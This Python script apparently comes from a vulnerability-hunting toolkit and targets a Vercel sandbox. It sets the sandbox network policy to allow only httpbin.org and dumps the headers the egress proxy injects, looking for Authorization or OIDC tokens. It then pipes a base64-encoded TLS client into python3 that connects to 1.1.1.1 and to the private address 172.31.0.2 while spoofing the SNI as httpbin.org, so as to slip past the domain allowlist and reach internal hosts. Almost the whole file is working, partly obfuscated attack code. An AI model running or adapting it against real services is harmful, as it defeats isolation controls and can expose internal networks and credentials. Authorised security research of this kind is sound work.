# -*- coding: utf-8 -*-
"""防火墙代理 headers 注入检查: httpbin /anything 完整回显
观察代理转发时自动注入的 headers (X-Forwarded-For / Authorization / Vercel 特有 / OIDC token?)
场景: custom allow httpbin.org, 直连 + SNI 欺骗 + 私有网段
"""
import base64, json, sys, time
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, cmd, TEAM, PROJ

c, r = api('GET', '/v2/sandboxes/npol1?teamId=%s&projectId=%s' % (TEAM, PROJ))
d = json.loads(r)
sid = d['sandbox']['currentSessionId']
print('npol1 sid:', sid, 'status:', d['sandbox']['status'], flush=True)
if d['sandbox'].get('status') != 'running':
    c, r = api('GET', '/v2/sandboxes/npol1?teamId=%s&projectId=%s&resume=true' % (TEAM, PROJ))
    d = json.loads(r)
    sid = d['sandbox']['currentSessionId']
    print('resumed sid:', sid, flush=True)
    time.sleep(5)

def parse_data(r):
    out = ''
    for line in r.splitlines():
        if '"data"' in line:
            try:
                out += json.loads(line).get('data', '')
            except Exception:
                pass
    return out

# 恢复 custom + allow httpbin.org
api('POST', '/v2/sandboxes/sessions/%s/network-policy?teamId=%s' % (sid, TEAM),
    {"mode": "custom", "allowedDomains": ["httpbin.org"]})
time.sleep(3)

# 直接 curl (走代理) 完整 headers
sc = "curl -sk --max-time 8 https://httpbin.org/anything 2>&1"
c, r = cmd(sid, 'sh', ['-c', sc], timeout_ms=30000)
out = parse_data(r)
print('[DIRECT-headers] %s' % out[:1500], flush=True)

# SNI 欺骗连 1.1.1.1 完整响应
TLS_CODE = '''import socket, ssl, sys
ip, sni = sys.argv[1], sys.argv[2]
try:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    s = ctx.wrap_socket(socket.create_connection((ip, 443), timeout=6), server_hostname=sni)
    s.sendall(b'GET /anything HTTP/1.1\\r\\nHost: ' + sni.encode() + b'\\r\\nConnection: close\\r\\n\\r\\n')
    d = b''
    while True:
        try:
            chunk = s.recv(8192)
            if not chunk: break
            d += chunk
        except Exception:
            break
    print(d.decode('utf-8', 'replace')[:2000])
except Exception as e:
    print('ERR', type(e).__name__, str(e)[:80])
'''
b64 = base64.b64encode(TLS_CODE.encode()).decode()
sc = 'echo %s | base64 -d | python3 - 1.1.1.1 httpbin.org' % b64
c, r = cmd(sid, 'sh', ['-c', sc], timeout_ms=45000)
out = parse_data(r)
print('[SPOOF1111-full] %s' % out[:2000], flush=True)

# 私有网段 + SNI 完整响应
sc = 'echo %s | base64 -d | python3 - 172.31.0.2 httpbin.org' % b64
c, r = cmd(sid, 'sh', ['-c', sc], timeout_ms=45000)
out = parse_data(r)
print('[VPC-full] %s' % out[:2000], flush=True)

print('=== HEADERS DONE ===', flush=True)
